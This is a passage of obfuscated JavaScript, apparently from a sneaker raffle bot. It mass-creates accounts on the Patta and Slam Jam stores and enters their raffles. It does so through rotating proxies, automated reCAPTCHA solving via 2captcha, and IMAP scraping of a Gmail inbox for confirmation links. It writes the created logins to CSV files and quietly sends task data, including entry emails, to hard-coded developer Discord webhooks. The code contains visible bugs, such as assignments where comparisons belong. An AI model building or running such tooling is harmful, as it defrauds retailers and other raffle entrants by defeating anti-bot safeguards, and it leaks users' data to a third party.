                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3485c1, _0x231226, _0x24c05b) {
                    var _0x231226 = [], _0x22d4e1 = ![];
                    async function _0x26e0b3() {
                        var _0xb17cdf = new _0x3602ef({
                            'user': _0x8702f0['masterMail'],
                            'password': _0x8702f0['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x598a2c(_0x5b7b29) {
                            _0xb17cdf['openBox']('INBOX', ![], _0x5b7b29);
                        }
                        _0xb17cdf['once']('ready', function () {
                            _0x598a2c(function (_0x118926, _0x141db0) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x118926)
                                    throw _0x118926;
                                _0xb17cdf['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x6280e0, _0x53d539) {
                                    if (!_0x53d539 || !_0x53d539['length'])
                                        console['log'](_0x441ea7() + '\x20[' + _0x3485c1['name'] + ']\x20No\x20mails\x20found'), _0xb17cdf['end']();
                                    else {
                                        var _0x3bde36 = _0xb17cdf['seq']['fetch'](_0x53d539, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3bde36['on']('message', function (_0xecf6c6, _0x2c8da1) {
                                            var _0x42b4a5 = '(#' + _0x2c8da1 + ')\x20';
                                            _0xecf6c6['on']('body', function (_0x596c94, _0x50fcee) {
                                                _0x40c426(_0x596c94, (_0x188fb1, _0x577f94) => {
                                                    var _0x3a4433 = _0x577f94['text']['split']('(')[0x1], _0x742eef = _0x3a4433['split'](')')[0x0];
                                                    _0x231226['push'](_0x742eef);
                                                });
                                            }), _0xecf6c6['once']('end', function () {
                                            });
                                        }), _0x3bde36['once']('error', function (_0x4009d9) {
                                            console['log']('Fetch\x20error:\x20' + _0x4009d9), _0x22d4e1 = !![];
                                        }), _0x3bde36['once']('end', function () {
                                            _0xb17cdf['end'](), _0x22d4e1 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0xb17cdf['once']('error', function (_0x30dfa0) {
                            console['log'](_0x30dfa0), _0x22d4e1 = !![];
                        }), _0xb17cdf['once']('end', async function () {
                            _0x22d4e1 = !![];
                        }), _0xb17cdf['connect']();
                    }
                    async function _0x48680c(_0x16b804, _0x3d053c, _0x16f600) {
                        for (var _0x19fec6 = 0x0; _0x19fec6 < _0x3d053c['length']; _0x19fec6++) {
                            async function _0x41083e(_0x59c9e4, _0x30bfe3, _0x129587, _0x260f7c, _0x78234a) {
                                var _0x25dd7f, _0x53ba95 = {}, _0x495f49 = [], _0x5db491 = {}, _0x3033dd = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x509073 = Math['round'](Math['random']() * (_0x3033dd['length'] - 0x1));
                                _0x260f7c[_0x59c9e4]['Size'] == 'RANDOM' && (_0x260f7c[_0x59c9e4]['Size'] = _0x3033dd[_0x509073]);
                                !_0x260f7c && (_0x260f7c = {});
                                if (_0x8702f0['useRandomProxy'] = ![])
                                    var _0x5f1dae = _0x78234a[_0x59c9e4]['split'](':');
                                else
                                    var _0x19f166 = Math['round'](Math['random']() * (_0x78234a['length'] - 0x1)), _0x5f1dae = _0x78234a[_0x19f166]['split'](':');
                                var _0x312f1a = {
                                    'jar': _0x44b991,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x129587['url'],
                                    'headers': _0x129587['headers'],
                                    'body': JSON['stringify'](_0x53ba95),
                                    'proxy': 'http://' + _0x5f1dae[0x2] + ':' + _0x5f1dae[0x3] + '@' + _0x5f1dae[0x0] + ':' + _0x5f1dae[0x1]
                                };
                                return _0x30bfe3 != 'ver' && (_0x312f1a['url'] = _0x129587['url'], _0x312f1a['headers'] = _0x129587['headers']), _0x30bfe3 == 'ver' && (_0x312f1a['method'] = 'GET', _0x312f1a['url'] = _0x260f7c[_0x59c9e4]), new Promise(function (_0x3b6729, _0x1aa6bf) {
                                    callback = async (_0x2e341f, _0x9732fb, _0x1c4f5f) => {
                                        if (!_0x2e341f && _0x9732fb['statusCode'] == 0xca || !_0x2e341f && _0x9732fb['statusCode'] == 0xc8) {
                                            if (_0x30bfe3 != 'ver') {
                                                var _0x43822b = await _0x296449(_0x260f7c[_0x59c9e4], _0x129587, 'dev', ![]), _0x224660 = await _0x296449(_0x260f7c[_0x59c9e4], _0x129587, 'pub', ![]);
                                                const _0x41da9d = {
                                                    'succesDEVMSG': { 'embeds': [_0x43822b] },
                                                    'succesPUBMSG': { 'embeds': [_0x224660] }
                                                };
                                                if (_0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '')
                                                    try {
                                                        await _0x10a0d6(_0x8702f0['webhook'], _0x41da9d['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x41da9d['succesDEVMSG']), await _0x7e80ad(0xc8);
                                                try {
                                                    await _0x10a0d6(_0x355433, _0x41da9d['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x4bdc1f(_0x260f7c[_0x59c9e4], _0x129587);
                                            }
                                            _0x3b6729(console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x129587['name'] + ']\x20Task\x20' + (_0x59c9e4 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x30bfe3 != 'ver') {
                                                var _0x2e7592 = '' + _0x2e341f, _0x1527ca = await _0x296449(_0x260f7c[_0x59c9e4], _0x129587, 'dev', !![], _0x2e7592), _0x241b31 = {};
                                                _0x241b31['errorDEV'] = { 'embeds': [_0x1527ca] }, _0xc1caad(_0x260f7c[_0x59c9e4], _0x129587), _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x241b31['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x241b31['errorDEV']);
                                            }
                                            _0x1aa6bf(console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x129587['name'] + ']\x20Task\x20' + (_0x59c9e4 + 0x1) + ':\x20' + _0x2e341f)));
                                        }
                                    };
                                    try {
                                        _0x30bfe3 != 'ver' ? console['log'](_0x441ea7() + '\x20[' + _0x129587['name'] + ']\x20Task\x20' + (_0x59c9e4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x53ba95['data']['attributes']['email']) : console['log'](_0x441ea7() + '\x20[' + _0x129587['name'] + ']\x20Task\x20' + (_0x59c9e4 + 0x1) + ':\x20Fetching\x20Response'), _0x394d0f(_0x312f1a, callback);
                                    } catch (_0x54f5d9) {
                                        console['log'](_0x441ea7() + '\x20Task\x20' + (_0x59c9e4 + 0x1) + ':\x20' + _0x54f5d9);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x41083e(_0x19fec6, 'ver', _0x16b804, _0x3d053c, _0x16f600), console['log'](_0x441ea7() + '\x20[' + _0x16b804['name'] + ']\x20Sleeping\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                            } catch (_0x267bbb) {
                            }
                        }
                    }
                    try {
                        _0x26e0b3();
                        while (!_0x22d4e1) {
                            await _0x7e80ad(0xfa0);
                        }
                        await _0x7e80ad(0xfa0), console['log']('Found\x20' + _0x231226['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x48680c(_0x3485c1, _0x231226, _0x24c05b);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3960f0, _0x3bf399, _0x135fa4) {
                    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8702f0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x273c11 = 0x0; _0x273c11 < _0x3bf399['length']; _0x273c11++) {
                        var _0x5b6f71 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x397af7
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x8702f0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4a89e9
                                }
                            ]
                        }];
                        const _0x4de202 = { 'embeds': _0x5b6f71 };
                        _0x16d703(_0x3960f0['name'] + '\x20Task\x20' + (_0x273c11 + 0x1) + '\x20/\x20' + _0x3bf399['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7), await _0x6f470f(_0x3bf399, _0x273c11);
                        var _0x2fa23b = await _0x296449(_0x3bf399[_0x273c11], _0x3960f0, 'acc', ![]);
                        const _0x30d549 = { 'succesDEVMSG': { 'embeds': [_0x2fa23b] } };
                        if (_0x3bf399[_0x273c11]['Email'] == '' || _0x3bf399[_0x273c11]['FirstName'] == '' || _0x3bf399[_0x273c11]['LastName'] == '') {
                            console['log'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x273c11 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x7e80ad(0x7d0);
                            continue;
                        }
                        (_0x3bf399[_0x273c11]['Password'] == '' || _0x3bf399[_0x273c11] == undefined) && _0x3bf399[_0x273c11]['Password'] == 'JRaffles23!';
                        if (_0x8702f0['useRandomProxy'] = ![])
                            var _0x4f6406 = _0x135fa4[_0x273c11]['split'](':');
                        else
                            var _0x1be622 = Math['round'](Math['random']() * (_0x135fa4['length'] - 0x1)), _0x4f6406 = _0x135fa4[_0x1be622]['split'](':');
                        const _0x37c85 = await _0x25d1cc['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4f6406[0x0] + ':' + _0x4f6406[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x25ae86 = await _0x37c85['newPage']();
                            await _0x25ae86['authenticate']({
                                'username': '' + _0x4f6406[0x2],
                                'password': '' + _0x4f6406[0x3]
                            }), console['log'](_0x441ea7() + '\x20[' + _0x3960f0['name'] + ']\x20Task\x20' + (_0x273c11 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x25ae86['setRequestInterception'](!![]), _0x25ae86['on']('request', _0x327dc8 => {
                                _0x327dc8['resourceType']() === 'image' || _0x327dc8['resourceType']() === 'font' || _0x327dc8['resourceType']() === 'media' ? _0x327dc8['abort']() : _0x327dc8['continue']();
                            }), await _0x25ae86['goto']('https://patta.nl/account/register'), await _0x7e80ad(0xbb8), await _0x25ae86['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x441ea7() + '\x20[' + _0x3960f0['name'] + ']\x20Task\x20' + (_0x273c11 + 0x1) + '\x20:\x20Filling\x20information'), await _0x25ae86['type']('#RegisterForm-FirstName', '' + _0x3bf399[_0x273c11]['FirstName']), await _0x7e80ad(0x226), await _0x25ae86['type']('#RegisterForm-LastName', '' + _0x3bf399[_0x273c11]['LastName']), await _0x7e80ad(0x226), await _0x25ae86['type']('#RegisterForm-email', '' + _0x3bf399[_0x273c11]['Email']), await _0x7e80ad(0x226), await _0x25ae86['type']('#RegisterForm-password', '' + _0x3bf399[_0x273c11]['Password']), await _0x7e80ad(0x226), console['log'](_0x441ea7() + '\x20[' + _0x3960f0['name'] + ']\x20Task\x20' + (_0x273c11 + 0x1) + '\x20:\x20Submitting..'), await _0x25ae86['$eval']('#RegisterForm', _0x5c0b3a => _0x5c0b3a['submit']()), await _0x7e80ad(0x1f40);
                            try {
                                await _0x25ae86['waitForSelector']('.home-page-grid__collection'), await _0x7e80ad(0x1f4), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x3960f0['name'] + ']\x20Task\x20' + (_0x273c11 + 0x1) + '\x20:\x20Account\x20' + _0x3bf399[_0x273c11]['Email'] + '\x20Generated!')), _0x40e0db['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x3bf399[_0x273c11]['Email'] + ',' + _0x3bf399[_0x273c11]['Password']), console['log'](_0x1a235e['yellow'](_0x441ea7() + '\x20[' + _0x3960f0['name'] + ']\x20Task\x20' + (_0x273c11 + 0x1) + '\x20:\x20Account\x20' + _0x3bf399[_0x273c11]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x30d549['succesDEVMSG']);
                                } catch {
                                }
                                await _0x10a0d6(_0x54e762, _0x30d549['succesDEVMSG']);
                            } catch (_0x414823) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x273c11 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x414823));
                            }
                        } catch (_0x1442e1) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x273c11 + 0x1) + '\x20:\x20' + _0x1442e1));
                        } finally {
                            _0x37c85 && _0x37c85['close'](), console['log']('Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x16ae8e, _0x125ffe, _0x317ba0) {
                    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8702f0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x46d869 = 0x0; _0x46d869 < _0x125ffe['length']; _0x46d869++) {
                        var _0x19ae56;
                        if (_0x18a96a != 'yes')
                            var _0x18a96a = '', _0x22db7f = 0x0;
                        _0x16d703(_0x16ae8e['name'] + '\x20Task\x20' + (_0x46d869 + 0x1) + '\x20/\x20' + _0x125ffe['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7), await _0x6f470f(_0x125ffe, _0x46d869);
                        if (_0x125ffe[_0x46d869]['Email'] == '' || _0x125ffe[_0x46d869]['Password'] == '' || _0x125ffe[_0x46d869]['FirstName'] == '' || _0x125ffe[_0x46d869]['LastName'] == '') {
                            console['log'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x8702f0['useRandomProxy'] = ![])
                            var _0x57990a = _0x317ba0[_0x46d869]['split'](':');
                        else
                            var _0x58fbe2 = Math['round'](Math['random']() * (_0x317ba0['length'] - 0x1)), _0x57990a = _0x317ba0[_0x58fbe2]['split'](':');
                        const _0x4095d7 = await _0x25d1cc['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x57990a[0x0] + ':' + _0x57990a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0xf451d1 = await _0x4095d7['newPage']();
                            await _0xf451d1['authenticate']({
                                'username': '' + _0x57990a[0x2],
                                'password': '' + _0x57990a[0x3]
                            }), console['log'](_0x441ea7() + '\x20[' + _0x16ae8e['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xf451d1['setRequestInterception'](!![]), _0xf451d1['on']('request', _0x42a85c => {
                                _0x42a85c['resourceType']() === 'image' || _0x42a85c['resourceType']() === 'font' || _0x42a85c['resourceType']() === 'media' ? _0x42a85c['abort']() : _0x42a85c['continue']();
                            }), await _0xf451d1['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xf451d1['waitForSelector']('#CustomerEmail'), console['log'](_0x441ea7() + '\x20[' + _0x16ae8e['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Logging\x20in..'), await _0xf451d1['type']('#CustomerEmail', '' + _0x125ffe[_0x46d869]['Email']), await _0x7e80ad(0x12c), await _0xf451d1['type']('#CustomerPassword', '' + _0x125ffe[_0x46d869]['Password']), await _0x7e80ad(0x226), await _0xf451d1['$eval']('#customer_login', _0x2ae1fa => _0x2ae1fa['submit']());
                            try {
                                await _0xf451d1['waitForSelector']('#orders'), await _0x7e80ad(0x4b0);
                            } catch {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x16ae8e['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0xf451d1['goto']('' + _0x125ffe[_0x46d869]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x7e80ad(0xbb8), console['log'](_0x441ea7() + '\x20[' + _0x16ae8e['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0xf451d1['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x16ae8e['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0xf451d1['type']('#email', '' + _0x125ffe[_0x46d869]['Email']), await _0x7e80ad(0x384), await _0xf451d1['type']('#first_name', '' + _0x125ffe[_0x46d869]['FirstName']), await _0x7e80ad(0x514), await _0xf451d1['type']('#last_name', '' + _0x125ffe[_0x46d869]['LastName']), await _0x7e80ad(0x514), await _0xf451d1['type']('#street_address', _0x125ffe[_0x46d869]['Address1'] + '\x20' + _0x125ffe[_0x46d869]['HouseNumber'] + '\x20' + _0x125ffe[_0x46d869]['Address2']), await _0x7e80ad(0x2bc);
                            _0x125ffe[_0x46d869]['Postcode'] == undefined && (_0x125ffe[_0x46d869]['Postcode'] = _0x125ffe[_0x46d869]['Zip']);
                            await _0xf451d1['type']('#zip_code', '' + _0x125ffe[_0x46d869]['Postcode']), await _0x7e80ad(0x320), await _0xf451d1['type']('#city', '' + _0x125ffe[_0x46d869]['City']), await _0x7e80ad(0x320), await _0xf451d1['type']('#bday', '01/01/1994'), await _0x7e80ad(0x320), await _0xf451d1['type']('#instagram', '' + _0x125ffe[_0x46d869]['Follower']), await _0x7e80ad(0x352);
                            if (_0x125ffe[_0x46d869]['Size'] == 'RANDOM') {
                                const _0x515cea = await _0xf451d1['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x589ac8 => {
                                    return _0x589ac8['map'](_0x2de72f => _0x2de72f['textContent']);
                                });
                                var _0x597d84 = Math['round'](Math['random']() * (_0x515cea['length'] - 0x1));
                                console['log'](_0x441ea7() + '\x20[' + _0x16ae8e['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x515cea[_0x597d84]), await _0xf451d1['click']('label[data-eu-size=\x22' + _0x515cea[_0x597d84] + '\x22]');
                            } else {
                                console['log'](_0x441ea7() + '\x20[' + _0x16ae8e['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x125ffe[_0x46d869]['Size']);
                                try {
                                    await _0xf451d1['click']('label[data-eu-size=\x22' + _0x125ffe[_0x46d869]['Size'] + '\x22]');
                                } catch {
                                    await _0xf451d1['click']('label[data-eu-size=\x22' + _0x125ffe[_0x46d869]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x7e80ad(0xbb8), await _0xf451d1['$$eval']('.raffle__checkbox-label', _0x17aa7f => _0x17aa7f['forEach'](_0x4a28b6 => _0x4a28b6['click']())), await _0x7e80ad(0x7d0), console['log'](_0x441ea7() + '\x20[' + _0x16ae8e['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0xf451d1['click']('#raffle__form-submit'), await _0x7e80ad(0x1388);
                            try {
                                await _0xf451d1['waitForSelector']('#raffle__confirmation-message-container'), _0x18a96a = 'no', _0x4bdc1f(_0x125ffe[_0x46d869], _0x16ae8e), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x16ae8e['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x2831bf) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x2831bf));
                            }
                        } catch (_0x1dc1e8) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20' + _0x1dc1e8)), _0x18a96a = 'yes';
                        } finally {
                            _0x4095d7 && _0x4095d7['close']();
                            if (_0x18a96a == 'yes' && _0x22db7f != 0x5 && _0x19ae56 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x16ae8e['name'] + ']\x20Task\x20' + (_0x46d869 + 0x1) + '\x20:\x20Retrying')), _0x46d869 = _0x46d869 - 0x1, _0x22db7f = _0x22db7f + 0x1;
                                continue;
                            }
                            _0x18a96a == 'yes' && _0x22db7f >= 0x5 && (_0xc1caad(_0x125ffe[_0x46d869], _0x16ae8e), _0x18a96a = 'no', _0x22db7f = 0x0), console['log']('Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x5d50e7, _0x46f925, _0x1b927e) {
                    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8702f0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x11970c = 0x0; _0x11970c < _0x46f925['length']; _0x11970c++) {
                        if (_0x1d50a9 != 'yes')
                            var _0x1d50a9 = '', _0x4b24ee = 0x0;
                        var _0x78c2ca = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x397af7
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x8702f0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4a89e9
                                }
                            ]
                        }];
                        const _0x2936a7 = { 'embeds': _0x78c2ca };
                        _0x16d703(_0x5d50e7['name'] + '\x20Task\x20' + (_0x11970c + 0x1) + '\x20/\x20' + _0x46f925['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7), await _0x6f470f(_0x46f925, _0x11970c);
                        var _0x2f9fa4 = await _0x296449(_0x46f925[_0x11970c], _0x5d50e7, 'acc', ![]);
                        const _0x2b5653 = { 'succesDEVMSG': { 'embeds': [_0x2f9fa4] } };
                        if (_0x46f925[_0x11970c]['Email'] == '' || _0x46f925[_0x11970c]['FirstName'] == '' || _0x46f925[_0x11970c]['LastName'] == '') {
                            console['log'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x11970c + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x7e80ad(0x7d0);
                            continue;
                        }
                        (_0x46f925[_0x11970c]['Password'] == '' || _0x46f925[_0x11970c] == undefined) && _0x46f925[_0x11970c]['Password'] == 'JRaffles23!';
                        if (_0x8702f0['useRandomProxy'] = ![])
                            var _0x3b6249 = _0x1b927e[_0x11970c]['split'](':');
                        else
                            var _0x396122 = Math['round'](Math['random']() * (_0x1b927e['length'] - 0x1)), _0x3b6249 = _0x1b927e[_0x396122]['split'](':');
                        const _0x1f8219 = await _0x25d1cc['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3b6249[0x0] + ':' + _0x3b6249[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0xb9451d = await _0x1f8219['newPage']();
                            await _0xb9451d['authenticate']({
                                'username': '' + _0x3b6249[0x2],
                                'password': '' + _0x3b6249[0x3]
                            }), console['log'](_0x441ea7() + '\x20[' + _0x5d50e7['name'] + ']\x20Task\x20' + (_0x11970c + 0x1) + '\x20:\x20Getting\x20Session'), await _0xb9451d['setRequestInterception'](!![]), _0xb9451d['on']('request', _0x16c5dd => {
                                _0x16c5dd['resourceType']() === 'image' || _0x16c5dd['resourceType']() === 'font' || _0x16c5dd['resourceType']() === 'media' ? _0x16c5dd['abort']() : _0x16c5dd['continue']();
                            }), await _0xb9451d['goto']('https://drop.slamjam.com/account/register'), await _0x7e80ad(0xbb8), await _0xb9451d['waitForSelector']('#FirstName'), await _0xb9451d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xb9451d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x441ea7() + '\x20[' + _0x5d50e7['name'] + ']\x20Task\x20' + (_0x11970c + 0x1) + '\x20:\x20Filling\x20information'), await _0x7e80ad(0x4b0), await _0xb9451d['type']('#FirstName', '' + _0x46f925[_0x11970c]['FirstName']), await _0x7e80ad(0x226), await _0xb9451d['type']('#LastName', '' + _0x46f925[_0x11970c]['LastName']), await _0x7e80ad(0x226), await _0xb9451d['type']('#Email', '' + _0x46f925[_0x11970c]['Email']), await _0x7e80ad(0x2ee), await _0xb9451d['type']('#ConfirmEmail', '' + _0x46f925[_0x11970c]['Email']), await _0x7e80ad(0x2ee), await _0xb9451d['type']('#CreatePassword', '' + _0x46f925[_0x11970c]['Password']), await _0x7e80ad(0x2ee), await _0xb9451d['type']('#CreateConfirmPassword', '' + _0x46f925[_0x11970c]['Password']), await _0x7e80ad(0x226), console['log'](_0x441ea7() + '\x20[' + _0x5d50e7['name'] + ']\x20Task\x20' + (_0x11970c + 0x1) + '\x20:\x20Submitting..'), await _0xb9451d['$eval']('#create_customer', _0x23e567 => _0x23e567['submit']()), await _0x7e80ad(0x1388), console['log'](_0x441ea7() + '\x20[' + _0x5d50e7['name'] + ']\x20Task\x20' + (_0x11970c + 0x1) + '\x20:\x20' + _0x1a235e['cyan']('Solving\x20Captcha')), await _0xb9451d['solveRecaptchas'](), console['log'](_0x441ea7() + '\x20[' + _0x5d50e7['name'] + ']\x20Task\x20' + (_0x11970c + 0x1) + '\x20:\x20Captcha\x20solved'), await _0xb9451d['$eval']('.shopify-challenge__container\x20>\x20form', _0x10fab3 => _0x10fab3['submit']());
                            try {
                                await _0xb9451d['waitForSelector']('.product-card__image'), await _0x7e80ad(0x1f4), _0x1d50a9 = 'no', console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x5d50e7['name'] + ']\x20Task\x20' + (_0x11970c + 0x1) + '\x20:\x20Account\x20' + _0x46f925[_0x11970c]['Email'] + '\x20Generated!')), _0x40e0db['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x46f925[_0x11970c]['Email'] + ',' + _0x46f925[_0x11970c]['Password']), console['log'](_0x1a235e['yellow'](_0x441ea7() + '\x20[' + _0x5d50e7['name'] + ']\x20Task\x20' + (_0x11970c + 0x1) + '\x20:\x20Account\x20' + _0x46f925[_0x11970c]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x2b5653['succesDEVMSG']);
                                } catch {
                                }
                                await _0x10a0d6(_0x54e762, _0x2b5653['succesDEVMSG']);
                            } catch (_0x321c3c) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x11970c + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x321c3c));
                            }
                        } catch (_0x3dacb5) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x11970c + 0x1) + '\x20:\x20' + _0x3dacb5));
                        } finally {
                            _0x1f8219 && _0x1f8219['close']();
                            if (_0x1d50a9 == 'yes' && _0x4b24ee != 0x5) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x5d50e7['name'] + ']\x20Task\x20' + (_0x11970c + 0x1) + '\x20:\x20Retrying')), _0x11970c = _0x11970c - 0x1, _0x4b24ee = _0x4b24ee + 0x1;
                                continue;
                            }
